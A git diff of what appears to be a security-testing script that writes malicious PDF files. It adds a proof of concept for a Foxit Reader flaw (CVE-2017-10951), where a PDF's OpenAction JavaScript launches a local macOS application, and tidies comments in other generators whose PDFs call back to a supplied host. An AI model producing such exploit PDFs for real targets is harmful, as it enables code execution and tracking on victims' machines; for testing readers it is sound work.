@@ -18,6 +18,19 @@ if sys.version_info[0] < 3:
 
 import io
 
+# Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
+# Source: https://twitter.com/l33d0hyun/status/1448342241647366152 
+# This sample contains no phone-home
+def create_malpdf10(filename):
+    with open(filename, "w") as file:
+        file.write('''%PDF-1.7
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>>
+2 0 obj
+<</S /JavaScript /JS (
+this.getURL("file:///System/Applications/Calculator.app")
+)>> trailer <</Root 1 0 R>>'''
+
 ## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
 ## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf9(filename, host):
@@ -410,11 +423,11 @@ startxref
 %%EOF
 ''')
 
+#a pdf file where javascript code is evaluated for execution
+# % BSD Licence, Ange Albertini, 2011
 def create_malpdf3(filename, host):
     with open(filename, "w") as file:
-        file.write('''% a pdf file where javascript code is evaluated for execution
-% BSD Licence, Ange Albertini, 2011
-%PDF-1.4
+        file.write('''%PDF-1.4
 1 0 obj
 <<>>
 %endobj
@@ -436,11 +449,7 @@ trailer
 
 def create_malpdf2(filename, host):
     with open(filename, "w") as file:
-        file.write('''% a PDF file using an XFA
-% most whitespace can be removed (truncated to 570 bytes or so...)
-% Ange Albertini BSD Licence 2012
-% modified by InsertScript
-%PDF-1. % can be truncated to %PDF-\0
+        file.write('''%PDF-1
 1 0 obj <<>>
 stream
 <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
@@ -486,11 +495,7 @@ trailer <<
 # From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
 def create_malpdf4(filename, host):
     with open(filename, "w") as file:
-        file.write('''% a PDF file using an XFA
-% most whitespace can be removed (truncated to 570 bytes or so...)
-% Ange Albertini BSD Licence 2012
-
-%PDF-1. % can be truncated to %PDF-
+        file.write('''%PDF-
 
 1 0 obj <<>>
 stream
@@ -612,5 +617,6 @@ if __name__ == "__main__":
   create_malpdf7("test8.pdf", 'https://' + host)
   create_malpdf8("test9.pdf", 'https://' + host)
   create_malpdf9("test10.pdf", 'https://' + host)
+  create_malpdf10("test11.pdf")
 
   print("Done.")
